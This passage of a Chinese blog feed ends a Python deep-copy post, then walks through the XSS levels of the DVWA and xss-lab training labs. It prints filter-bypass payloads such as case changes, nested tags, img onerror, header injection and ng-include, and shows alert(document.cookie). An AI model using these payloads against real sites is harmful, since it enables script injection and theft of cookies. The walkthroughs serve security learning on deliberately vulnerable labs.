class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d=copy.deepcopy(c)</span><br><span class="line">&gt;&gt;&gt; id(c)</span><br><span class="line">1408115280264</span><br><span class="line">&gt;&gt;&gt; id(d)</span><br><span class="line">1408115279944</span><br><span class="line">&gt;&gt;&gt; id(c[0])</span><br><span class="line">1408115186504</span><br><span class="line">&gt;&gt;&gt; id(c[1])</span><br><span class="line">1408115091144</span><br><span class="line">&gt;&gt;&gt; id(d[0])</span><br><span class="line">1408115279880</span><br></pre></td></tr></table></figure><h6 id="第二种-1"><a href="#第二种-1" class="headerlink" title="第二种"></a>第二种</h6><p>外层数据类型不可变，如果里面是可变数据类型，会新开辟地址空间存放。如果内部数据类型不可变，才会如同浅拷贝一样，是对地址的引用。</p><p>外层数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; tuple=(&apos;1&apos;,&apos;2&apos;,[&apos;3&apos;])</span><br><span class="line">&gt;&gt;&gt; te = copy.deepcopy(tuple)</span><br><span class="line">&gt;&gt;&gt; id(tuple)</span><br><span class="line">1408115001816</span><br><span class="line">&gt;&gt;&gt; id(te)</span><br><span class="line">1408115260944</span><br></pre></td></tr></table></figure><p>id是不一样的</p><p>内层数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; id(tuple[0])</span><br><span class="line">1408111993160</span><br><span class="line">&gt;&gt;&gt; id(te[0])</span><br><span class="line">1408111993160</span><br><span class="line">&gt;&gt;&gt; id(tuple[2])</span><br><span class="line">1408115280200</span><br><span class="line">&gt;&gt;&gt; id(te[2])</span><br><span class="line">1408115280520</span><br></pre></td></tr></table></figure><p>不同的类型是不一样的，不可变数据的id是一样的，可变数据的id是不一样的</p><p>1、需要将当前对象拷贝的时候，一般建议拷贝为浅拷贝，（效率高，内存占有少）</p><p>2、如果说，就是需要完全分离，请使用深拷贝</p><p>结论：</p><p>元组、字符串、数值这些不可变类型，所有深浅拷贝后，永远只有一份内存</p><p>注意特殊情况，如元组中的存在可变类型的元素</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;深浅拷贝&lt;/p&gt;
    
    </summary>
    
      <category term="python" scheme="http://soliym.top/categories/python/"/>
    
    
      <category term="高级编程" scheme="http://soliym.top/tags/%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>DVWA-xss详细讲解</title>
    <link href="http://soliym.top/2020/05/07/DVWA-xss%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3/"/>
    <id>http://soliym.top/2020/05/07/DVWA-xss详细讲解/</id>
    <published>2020-05-07T12:08:12.727Z</published>
    <updated>2020-05-08T02:09:39.300Z</updated>
    
    <content type="html"><![CDATA[<p>XSS，全称跨站脚本，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要修改的是，XSS不仅仅扩展JavaScript，还包括flash等其他脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。</p><a id="more"></a><h4 id="XSS分类："><a href="#XSS分类：" class="headerlink" title="XSS分类："></a>XSS分类：</h4><p>反射型xss：只是简单地把用户输入的数据反射给浏览器，简单来说，黑客往往需要用户诱使用户点击一个恶意链接，才能攻击成功。</p><p>存储型XSS：将用户输入的数据存储在服务器端。</p><p>DOM　XSS：通过修改页面的DOM节点形成的XSS。</p><h4 id="反射型-Reflected"><a href="#反射型-Reflected" class="headerlink" title="反射型-Reflected"></a>反射型-Reflected</h4><h5 id="LOW等级："><a href="#LOW等级：" class="headerlink" title="LOW等级："></a>LOW等级：</h5><p>​    当我们输入数据时，会在hello后面回显，判断该过程是有客户输入，然后经过后台处理，回显在页面上，使用脚本试探</p><pre><code>&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</code></pre><p>​    弹出消息框，存在xss漏洞</p><p>​    获取cookie值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>​    查看源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) &#123;</span><br><span class="line">    // Feedback for end user</span><br><span class="line">    echo &apos;&lt;pre&gt;Hello &apos; . $_GET[ &apos;name&apos; ] . &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    后台通过get方法获取变量名为name的值，然后通过echo显示在页面上，显示的内容是在html标签”pre”内的，因此，我们可以构造一个js脚本“script”，让这个脚本标签包含在“pre”标签内，当浏览器解析该html页面时，就会把我们输入的代码当成脚本处理，通过脚本我们就可以获取用户的cookie值或攻击用户，这样就会形成xss漏洞</p><h5 id="medium等级："><a href="#medium等级：" class="headerlink" title="medium等级："></a>medium等级：</h5><p>​    先输入“script”试探页面的防御机制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>​    根据显示的内容：alert(‘xss’)</p><p>​    “script”关键字，被过滤了，我们首先考虑绕过该过滤</p><p>方法一：大写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure><p>​    弹出消息框，可以实现xss注入</p><p>方法二：嵌套</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(&apos;xss&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>​    弹出消息框，可以实现xss注入</p><p>方法三：其他标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt; //需要点击链接</span><br></pre></td></tr></table></figure><p>​    弹出消息框，可以实现xss注入</p><p>​    查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] );</span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure><p>​    str_replace函数将第三个参数中的第一个参数，替换为第二个参数，即，将name变量的值中的“script”替换为‘ ’，而且是小写的，这个页面只有这一个防御，很容易就可以绕过，方法很多</p><h5 id="high等级："><a href="#high等级：" class="headerlink" title="high等级："></a>high等级：</h5><p>​    首先用“script”试探页面防御机制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>​    根据页面的回显，只返回“&gt;”,其它的都被过滤了，目前并不清楚清除防御机制，采用其它方法试探</p><p>方法一：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure><p>​    无弹窗，不能注入</p><p>方法二：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(&apos;xss&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>​    无弹窗，不能注入</p><p>方法三：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt;</span><br></pre></td></tr></table></figure><p>​    有消息弹出，可以注入</p><p>在这几个方法中，只有换标签的方法可以，我们可以猜测到的是，后台对“script”这几个字符做了过滤</p><p>​    查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure><p>​    采用正则表达式的方式，来匹配“&lt;script”,并且是/i,所以大小写，嵌套都是无用的，只有换标签可以</p><p>impossible等级：</p><p>​    impossible等级是一种比较安全的防御，暂时无法破解，对于常用的xss注入手段都可以防御</p><p>​    查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line">    $name = htmlspecialchars( $_GET[ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure><p>​    首先会检查用户是否合法，user_token和session</p><p>​    htmlspecialchars该函数的作用是将一些特殊字符转换为html实体编码</p><p>​        编码：“&lt;”   “&gt;”   “&amp;”  “ 单引号 “ “ 双引号  “</p><p>​    所有的html标签都是带有尖括号的，而且如果采用事件属性，需要闭合“pre”同样需要尖括号，所以杜绝了xss注入</p><h4 id="存储型-stored"><a href="#存储型-stored" class="headerlink" title="存储型-stored"></a>存储型-stored</h4><h5 id="low等级："><a href="#low等级：" class="headerlink" title="low等级："></a>low等级：</h5><p>​    message</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>​    name（字数限制，可以在浏览器的查看器中更改字数限制maxlength=”10”）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>​    在message和name都可以xss注入，注入的数据是存储在数据库中的，所以不会消失，每当用户访问页面时，都会触发页面从数据库输出信息，当注入的代码在浏览器中执行时，就会触发</p><p>​    查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$message = trim( $_POST[ &apos;mtxMessage&apos; ] );</span><br><span class="line">$name    = trim( $_POST[ &apos;txtName&apos; ] ); </span><br><span class="line">$message = stripslashes( $message ); </span><br><span class="line">.....</span><br><span class="line">$query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;;</span><br></pre></td></tr></table></figure><p>​    trim函数：删除头尾的空格</p><p>​    stripslashes：删除message中的反斜杠</p><p>​    所有输入的数据都被存储在数据库中，所以从数据库调取数据就会触发xss注入的代码</p><h5 id="medium等级：-1"><a href="#medium等级：-1" class="headerlink" title="medium等级："></a>medium等级：</h5><p>​    现在针对xss攻击的方法就很固定了，就是前面的方法，慢慢试探页面的防御机制</p><p>name：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=&apos;alert(1)&apos;&gt;</span><br></pre></td></tr></table></figure><p>message：</p><p>​    message采用前面几种方法都是不行</p><p>​    查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$message = trim( $_POST[ &apos;mtxMessage&apos; ] );</span><br><span class="line">$name    = trim( $_POST[ &apos;txtName&apos; ] );</span><br><span class="line">$message = strip_tags( addslashes( $message ) );</span><br><span class="line"></span><br><span class="line">$message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">$name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name );</span><br><span class="line"></span><br><span class="line">$query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;;</span><br></pre></td></tr></table></figure><p>​    函数：</p><p>​    trim：删除头尾的空格</p><p>​    addslashes：在双引号前加反斜杠</p><p>​    Strip_tags：剥离字符串的html标签</p><p>​    htmlspecialchars：将特殊字符转换为 HTML 实体</p><p>​    对message有htmlspecialchars防御，所以只能从name入手</p><h5 id="high等级：-1"><a href="#high等级：-1" class="headerlink" title="high等级："></a>high等级：</h5><p>​    通过试探，这一关的注入方式与反射型是一样的，采用其他标签</p><p>​    查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name );</span><br></pre></td></tr></table></figure><p>​    在源代码中，message依然是实体化，只能从name入手，但是与上一关相比，对”script”做了过滤，与反射型的high一样，采用其他标签</p><p>​    name：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt;</span><br></pre></td></tr></table></figure><h5 id="impossible等级："><a href="#impossible等级：" class="headerlink" title="impossible等级："></a>impossible等级：</h5><p>​    可能已经猜到了impossible的防御机制，对name和message做了实体化过滤</p><p>​    查看代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$message = htmlspecialchars( $message ); </span><br><span class="line"></span><br><span class="line">$name = htmlspecialchars( $name );</span><br></pre></td></tr></table></figure><p>​    所有都被实体化，所以不能xss注入</p><h4 id="DOM型："><a href="#DOM型：" class="headerlink" title="DOM型："></a>DOM型：</h4><h5 id="low等级：-1"><a href="#low等级：-1" class="headerlink" title="low等级："></a>low等级：</h5><p>​    这一关没有输入的地方，是一个下拉菜单栏，当我们选择其中一个后，会在浏览器顶部地址栏中，显示”default=English”,然后在下拉菜单栏中，右键检查元素，可以看到”select”的变量名是default，后面紧接一个脚本，比较长，大概就是选择一个选项，就会创建这个选项的”option”,而标签内显示的内容，就是选中的选项。这里就会有一个xss漏洞，如果我们在地址栏里面，修改default的值为脚本代码，这样就会在“option”建立一个脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>​    弹出消息框，注入成功，后台没有防御机制</p><h5 id="medium等级：-2"><a href="#medium等级：-2" class="headerlink" title="medium等级："></a>medium等级：</h5><p>​    通过前面的方法试探发现不可以，查看源代码    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (stripos ($default, &quot;&lt;script&quot;) !== false) &#123;</span><br><span class="line">        header (&quot;location: ?default=English&quot;);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>​    stripos：查找&lt;script在default中第一次出现的位置</p><p>xss注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt;</span><br></pre></td></tr></table></figure><p>“script”被过滤，所以采用其他标签，先闭合’option’和‘select’，然后注入标签，在标签中携带代码</p><h5 id="high等级：-2"><a href="#high等级：-2" class="headerlink" title="high等级："></a>high等级：</h5><p>​    查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">switch ($_GET[&apos;default&apos;]) &#123;</span><br><span class="line">        case &quot;French&quot;:</span><br><span class="line">        case &quot;English&quot;:</span><br><span class="line">        case &quot;German&quot;:</span><br><span class="line">        case &quot;Spanish&quot;:</span><br><span class="line">            # ok</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            header (&quot;location: ?default=English&quot;);</span><br><span class="line">            exit;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在这里对default的内容做了限制，</p><p>xss注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">English#&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>让switch不去查看后面的代码</p><h5 id="impossible等级：-1"><a href="#impossible等级：-1" class="headerlink" title="impossible等级："></a>impossible等级：</h5><p>查看代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"># Don&apos;t need to do anything, protction handled on the client side</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;XSS，全称跨站脚本，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要修改的是，XSS不仅仅扩展JavaScript，还包括flash等其他脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://soliym.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="xss" scheme="http://soliym.top/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>xss-lab(11-18)详细讲解</title>
    <link href="http://soliym.top/2020/05/06/xss-lab(11-18)%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3/"/>
    <id>http://soliym.top/2020/05/06/xss-lab(11-18)详细讲解/</id>
    <published>2020-05-06T08:47:10.339Z</published>
    <updated>2020-05-06T09:13:33.692Z</updated>
    
    <content type="html"><![CDATA[<p>xss注入与sql注入有很多相似之处，如果有sql学习的基础，那么学习xss将会很轻松，xss注入的方法总的来说就方面，一方面从js脚本入手，如果js方面的防御机制，可以考虑绕过，或者选择html的标签中的事件属性注入，本文并没有涉及flash xss攻击，flash xss会作为单独一章，而且也没有涉及存储型xss攻击，关于存储型xss会在dvwa中讲到</p><a id="more"></a><h6 id="第11关："><a href="#第11关：" class="headerlink" title="第11关："></a>第11关：</h6><p>这一关与上一关一样，需要盲猜注入的变量，通过逐个试探，只有t_sort才可以，回显信息，所以通过T_sort注入</p><p>xss注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_sort=2&quot; accesskey=&quot;x&quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot;</span><br></pre></td></tr></table></figure><p>通过测试，并没有注入成功，所以T_sort并不是接受的变量</p><p>查看源代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_SERVER[&apos;HTTP_REFERER&apos;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br></pre></td></tr></table></figure><p>通过查看源代码，我们知道所有的变量都是迷惑攻击者的，真正的输入点是在http的头部的</p><p>使用bp抓包，然后修改http数据包的报头，注入代码</p><p>在http的头部加入referer字段，该字段的值为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2&quot; accesskey=&quot;x&quot; onload=&quot;alert(1)&quot; type=&quot;text&quot;</span><br></pre></td></tr></table></figure><p>然后页面会出现input框，点击后就会出现消息框</p><p>本关的防御机制是通过隐藏输入点，如果攻击者不知道源码的情况下很难注入</p><h6 id="第12关："><a href="#第12关：" class="headerlink" title="第12关："></a>第12关：</h6><p>这一关是有提示的，在html代码中的input下，变量名t_ua的值，是浏览器的版本，真好对应user-agent字段，所以猜测是通过http头部注入，上一关也应该是有的，不过没有注意到</p><p>注入方法与上一关一样：抓包-修改-注入代码</p><p>在http的头部修改user-agent字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;</span><br></pre></td></tr></table></figure><p>本关的防御机制与上一关一样</p><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$str11=$_SERVER[&apos;HTTP_USER_AGENT&apos;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br></pre></td></tr></table></figure><p>是对尖括号有过滤的，所以采用事件注入</p><h6 id="第13关："><a href="#第13关：" class="headerlink" title="第13关："></a>第13关：</h6><p>这一关没有提示，不能确定是否还是通过http注入，所以先试探几个变量是否可用。在试探的过程中发现T_cook是有内容的，所以我们猜测注入点是cookie</p><p>通过抓包发现，cookie处的内容确实是t_cookie显示的内容，所以修改cookie的值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=2&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;</span><br></pre></td></tr></table></figure><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_COOKIE[&quot;user&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br></pre></td></tr></table></figure><p>对尖括号有过滤，所以采用事件注入</p><h6 id="第14关："><a href="#第14关：" class="headerlink" title="第14关："></a>第14关：</h6><p>这一关，没有注入点，整个页面是一个静态页面</p><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;</span><br><span class="line">&lt;center&gt;&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不</span><br><span class="line">会自动跳转。成功者&lt;a href=/xss/level15.php?src=1.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><h6 id="第15关："><a href="#第15关：" class="headerlink" title="第15关："></a>第15关：</h6><p>第15关html代码很少，找不到注入点，也不知道变量名，也没有提示，所以只能查看源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;src&quot;];</span><br><span class="line">echo &apos;&lt;body&gt;&lt;span class=&quot;ng-include:&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看到的是，变量名是“src”，这也没有提示，确实猜不到</p><p>通过试探，发现所有的输入都会被注视到 ngInclude: 1 之后，所以先了解一下 ngInclude它的作用</p><p>ng-include 指令用于包含外部的 HTML 文件。</p><p>包含的内容将作为指定元素的子节点。</p><p>ng-include 属性的值可以是一个表达式，返回一个文件名。</p><p>默认情况下，包含的文件需要包含在同一个域名下。</p><p>也就是说它的参数是一个html页面</p><p>先输入一个php页面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level15.php?src=&apos;level1.php&apos;</span><br></pre></td></tr></table></figure><p>发现在该页面会加载level1的页面，我们在15页面里面是没有注入点，但是在1页面里面有，尝试在1里面注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src=&apos;level1.php?name=1&lt;script&gt;alert(1)&lt;/script&gt;&apos;</span><br></pre></td></tr></table></figure><p>并没有被执行，因为通过htmlspecialchars($str)函数，有些特殊字符被转码了，转为了html实体，所以我们采用其他标签的事件属性触发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src=&apos;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&apos;</span><br></pre></td></tr></table></figure><h6 id="第16关："><a href="#第16关：" class="headerlink" title="第16关："></a>第16关：</h6><p>首先试探输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>其中script被过滤了，然后大小写输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure><p>大小写也被过滤了，嵌套写入</p><p>嵌套的部分被替换成了空格</p><p>换标签输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><p>空格也被编码了</p><p>空格采用url编码输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%0Asrc=1%0Aonerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);`</span><br><span class="line"></span><br><span class="line">`$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);`</span><br><span class="line"></span><br><span class="line">`$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);`</span><br><span class="line"></span><br><span class="line">`$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);`</span><br><span class="line"></span><br><span class="line">`$str5=str_replace(&quot;     &quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br></pre></td></tr></table></figure><h6 id="第17关："><a href="#第17关：" class="headerlink" title="第17关："></a>第17关：</h6><p>从这一关开始应该是flash xss注入，但是这一关可以不采用，可以通过闭合注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 